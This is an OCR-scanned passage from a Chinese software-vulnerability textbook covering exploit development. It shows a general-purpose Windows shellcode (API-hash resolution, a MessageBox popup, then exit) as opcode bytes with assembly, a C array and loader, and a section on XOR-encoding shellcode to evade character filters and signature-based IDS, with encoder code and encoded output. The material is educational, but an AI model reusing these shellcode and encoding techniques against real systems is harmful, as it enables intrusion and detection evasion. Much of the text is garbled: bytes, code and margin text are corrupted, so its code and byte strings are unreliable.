XOR EBX,EBX
"\xB7\x04"//
MOV BH,4
"\x2B\xE3"//
SUB ESP,EBX
\x66\xBB\x33\x32*//
MOV BX,3233
"\x53-//
PUSH EBX
\x68\×75\x73\x65\x72*//
PUSH 72657375
"\x54"//
PUSH ESP
95
---
## Page 121
0
day
"\x33\xD2-//
XOK EDX,EDX
安全
*\x64\x8B\x5A\x30"//
MOVEBX,DWORD PTR FS:[EDX+30】
"\x8B\x4B\x0C*//
MOV ECX,DWORD PTR DS:[EBX+C]
"\x8B\x49\x1C"//
MOV ECX,DWORD PTR DS:[ECX+1C]
：
软
"\x8B\x09*//
MOV ECX,DWORD PTR DS:[ECX]
件
MOV EBP,DWORD PTR DS:（ECX+8]
漏
"\XAD"//
LODS DWORD PTR DS:[ESI]
洞
"\x3D\x6A\x0A\x38\x1E*//
CMP EAX,1E380A6A
分
\x75\x05*//
JNZ SHORT popup_co.00401070
析
"\x95*/7
XCHG EAX,EBP
技
"\xFF\xS7\xF8*//
CALLDWORD PTR DS:[EDI-8]
术
\x95-/7
XCHG EAX,EBP
第
"\x60-//
PUSHAD
\x8B\x45\x3C*//
MOV EAX,DWORD PTR SS:[EBP+3C]
2
"\x8B\x4C\x05\x78-//
MOV ECX,DWORD PTR SS:[EBP+EAX+78]
版
"\x03\xCD-//
ADD ECX,EBP
"\x8B\x59\x20*//
MOV EBX,DWORD PTR DS:[ECX+20]
"\x03\xDD-//
ADD EBX,EBP
"\x33\xFF*//
XOR EDI,EDI
"\x47"//
INC EDI
"\x8B\x34\xBB"//
MOV ESI,DWORD PTR DS:[EBX+EDI*4]
"\x03\xF5*//
ADD ESI,EBP
"\x99"//
CDQ
"\x0F\xBE\x06*//
MOVSX EAX,BYTE PTR DS:[ESI]
"\x3A\xC4*//
CMP AL,AH
"\x74\x08-//
JE SHORT popup_Co.00401097
"\xC1\xCA\x07-//
ROR EDX,7
"\x03\xD0-//
ADD EDX,EAX
"\x46-//
INC ESI
"\xEB\xF1"//
JMP SHORT POpuP_CO.00401088
"\x3B\x54\x24\x1C"//
CMP EDX,DWORD PTR SS:[ESP+1C]
"\x75\xE4"//
JNZ SHORT popuP_cO.00401081
"\x8B\x59\x24*//
MOV EBX,DWORD PTR DS:[ECX+24]
"\x03\xDD*//
ADD EBX,EBP
"\x66\x8B\x3C\x7B"//
MOV DI,WORD PTR DS:[EBX+EDI*2]
"\x8B\x59\x1C//
MOV EBX,DWORD PTR DS:[ECX+IC]
"\x03\xDD-//
ADD EBX,EBP
\x03\x2C\xBB//
ADD EBP,DWORD PTR DS:[EBX+EDI*4]
"\x95*//
XCHGEAX,EBP
"\x5F"//
POP EDI
"\XAB*//
STOS DWORD PTR ES:[EDI]
"\x57*//
PUSH EDI
"\x61·//
POPAD
"\x3D\x6A\x0A\x38\x1E*//
CMP EAX,1E380A6A
"\x75\xA9*//
JNZ SHORT popuP_cO.00401063
96
---
## Page 122
第
\x33\xDB*//
XOR EBX,EBX
3
"\x53*//
PUSH EBX
章
\x68\x77\x651x731x74"//
PUSH74736577
"1x681x661x611x691x6C-//
PUSH 6C696166
开
"\x8B\XC4*//
MOV EAX,ESP
发
"\x53"//
PUSH EBX
shellcode
//.0sx\.
PUSH EAX
"\x50//
PUSH EAX
\x53-//
PUSH EBX
"\xFF\x57\xFC*//
CALLDWORDPTRDS:[EDI-4]
"\x53"//
PUSH EBX
的
艺术
·\xFF\x57\xF8·://
CALL DWORD PTR DS:[EDI-8]
上述这种保存在字符数组中的shellcode已经可以轻易地在exploit程序中使用了，也可以
用前边的shellcode装载程序单独加载运行。
char popup_general[]=
*\xFC\x68\x6A\x0A1x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C
\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53*
*\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B*
"x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95*
*\xFF\x57\xF8\x95\x60\x8B\x45\×3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59*
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A*
"\xC4\x74\x08\xC1\xCA1x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75*
\xE4\x8B\x59\×24\x03\xDD\x66\x8B\×3C\x7B\x8B\x59\x1C\x03\xDD\x03*
*\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB*
1x53\x68\x77\x651x73\x74\x68\x66\x611x69\x6C1×8B\xC4\x53\x50\x50*
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8*;
voidmain()
（
asm
lea eax,popup_general
pusheax
ret
这样，一段考虑了跨平台、健壮性、稳定性、通用性等各方面因素的高质量shellcode就生
成了。本书后面章节将在实验中反复使用这段shellcode。经过反复的实验，这段shellcode在各
种溢出利用场景下都表现出色。
通过本节的介绍，可以看出即使是经验丰富的汇编程序员，想要写出高质量的shellcode
也得着实花一翻工夫。事实上，若非真的有特殊需要，即使是经验丰富的hacker也不会总是自
己编写shellcode。大多数情况下，从Intermet上可以得到许多经典的shellcode。另外MetaSploit
97
---
## Page 123
0
day
通用漏洞测试架构3.0下的payload库中，目前已经包含了包括绑定端口、网马downloader、
安
远程shell、任意命令执行等在内的104种不同功能的经典shellcode。通过简单的参数配置，可
全
以轻易导出C语言格式、Perl语言格式、ruby语言格式、原始十六进制格式等形式的shellcode。
：
我们会在后面章节中专门介绍MataSploit的使用和开发。
软件
漏
3.5shellcode编码技术
洞
分析
3.5.1为什么要对shellcode编码
技术
在很多漏洞利用场景中，shellcode的内容将会受到限制。
首先，所有的字符事函数都会对NULL学节进行限制。通常我们需要选择特殊的指令来避
（第
免在shellcode中直接出现NULL字节（byte，ASCII函数）或字（word，Unicode函数）。
2
其次，有些函数还会要求shellcode必须为可见字符的ASCII值或Unicode值。在这种限制
版
较多的情况下，如果仍然通过挑选指令的办法控制shellcode的值的话，将会给开发带来很大困
难。毕竞用汇编语言写程序就已经不那么容易了，如果在关心程序逻辑和流程的同时，还要分
心去选择合适的指令将会让我这样不很聪明的程序员崩溃掉。
最后，除了以上提到的软件自身的限制之外，在进行网络攻击时，基于特征的IDS系统往
往也会对常见的shellcode进行拦截。
那么，怎样突破重重防护，把shellcode从程序接口安全地送入堆栈呢？一个比较容易想到
的办法就是给shellcode“养装打扮，让其“蒙混过关”后再展开行动。
我们可以先专心完成shellcode的逻辑，然后使用编码技术对shellcode进行编码，使其内
容达到限制的要求，最后再精心构造十几个字节的解码程序，放在shellcode开始执行的地方。
最终送入程序接口的
payload
解码指令
解码指令
原始的
Shellcode
经过编码器编码
相连
图3.5.1shellcode编码示意图
当exploit成功时，shellcode顶端的解码程序首先运行，它会在内存中将真正的shellcode
还原成原来的样子，然后执行之。这种对shellcode编码的方法和软件加壳的原理非常类似。
这样，我们只需要专注于几条解码指令，使其符合限制条件就行，相对于直接关注于整段
86
---
## Page 124
第
shellcode来说使问题简化了很多。本节我们就来实践这样一种方法。
3
章
首先由解码指令还原
解码完毕之后继续执
shellcode
行真正的shellcode
开
发
EIP
shellcode
解码指令
解码指令
EP
原始的
的
Shellcode
艺
术
图3.5.2shellcode解码示意图
题外话：很多病毒也会采取类似加壳的办法来躲避杀毒软件的查杀：首先对自身编码，
若直接查看病毒文件的代码节会发现只有几条用于解码的指令，其余都是无效指令；当
PE装入开始运行时，解码器将真正的代码指令还原出来，并运行之、实施破坏活动；杀
毒软件特一种特征记录之后，病毒开发者只富要使用新的编码算法（密钥）重新对PE文
件编码，即可躲过查茶。然而自古正邪不两立，近年来条毒软件开始普遍采用内存杀毒
的办法来增加查杀力度，就是等病毒装载完成并已还原出真面目的时候进行查杀。
3.5.2会“变形”的shellcode
下面将在上节所实现的通用shellcode的基础上，演示一个最简单的shellcode加壳过程，
这包括：对原始shellcode编码，开发解码器，将解码器和经过编码的shellcode送入装载器运
行调试。
最简单的编码过程莫过于异或运算了，因为对应的解码过程也同样最简单。我们可以编写
程序对shellcode的每个字节用特定的数据进行异或运算，使得整个shellcode的内容达到要求。
在编码时需要注意以下几点。
·用于异或的特定数据相当于加密算法的密钥，在选取时不可与shellcode已有字节相
同，否则编码后会产生NULL学节。
·可以选用多个密钥分别对shellcode的不同区域进行编码，但会增加解码操作的复
杂性。
·可以对shellcode进行很多轮编码运算。
这里给出一个我实现的最简单的基于异或运算的编码器，用于演示这种技术。
void encoder (char*input,unsigned char key,int display_flag)//bool
display_flag
C
int i=0,1en=0;
66
---
## Page 125
y安全：软件漏洞分析技术（第2版）
0
FILE*fp:
unsigned char
output;
len= strlen(input）:
output=（unsignedchar*)malloc（len+1);
if(!output)
printf("memory-erro!\n");
exit（0);
//encode the shellcode
for(i=0;i<len;i++)
output[i]
if（!（fp=fopen（"encode.txt","w+")))
printf('outputfile create erro")
exit（0):
fprintf(fp,
）
for（i=0:i
<len:i++）
fprintf(fp,
x0.2x
output
if（（i+1)816==0)
fprintf(fp
fprintt（fp,"\":"):
fclose（fp);
printf(dump the encoded shellcode toencode.txt OK!\n');
if(display_flag)//printto screen
for（i=0:i<len;i++）
printf（*80.2x",output[i]);
if（（i+1）816==0)
free(output):
100
---
## Page 126
第
encoder（）函数会使用传入的key参数对输入的数据逐一异或，并将其整理成十六进制的
3
形式dump进一个名为encode.txt的文件中。这里对第四节中的通用shellcode进行编码，密钥
章
采用0x44，在main中直接调用encoder(popup_general,0x44，1)，会得到经过编码的shellcode
开
如下：
发
"1xb8\x2c\x2e\x4e\x7c1x5a/x2c\x27\xcd\x951x0b)x2c\x76\x30\xd51x48*
shellcode:
"\xcf\xb0\xc9\x3a\xb0\x77\x9f\xf3\x40\x6f\xa7\x22\xff\x77\x76\x17*
"\x2c\x31\x37\x21\x36\x10\x77\x96\x20\xcf\x1e\x74\xcf\x0f\x48\xcf*
"\x0d\x58\xcf\x4d\xcf1x2d\x4c\xe9\x79\x2e1x4e\x7c\x5alx31\x41\xd1*
"\xbb)x13\xbc\xd1\x24\xcf\x01\x78\xcflx08\x41/x3c\x47\x891xcf\x1d
的
"\x64\x47\x99\x77\xbb\x03\xcf\x70\xff\x47/xb11xdd\x4b/xfa\x42\x7e
艺
"\x80\x30\x4c\x851x8e\x43\x47\x94\x02\xaf\xb5\x7f\x10\x60\x58\x31
术
*xa01xcf\x1d\x60\x47\x99\x22\xcf\x78\x3f\xcf1x1d\x58\x47\x99\x47-
\x68\xff\xdl\x1b\xef\x13\x25\x79\x2elx4e\x7c\x5a\x31\xed\x77\x9f*
"1x17\x2c\x331x211x371x301x2c1x221x251x2d\x28\xcf1x801x171x14lx14°
"\x17\xbb\x13\xb8\x17\xbb\x13\xbc\xd4:
对于解码，我们可以用以下几条指令实现。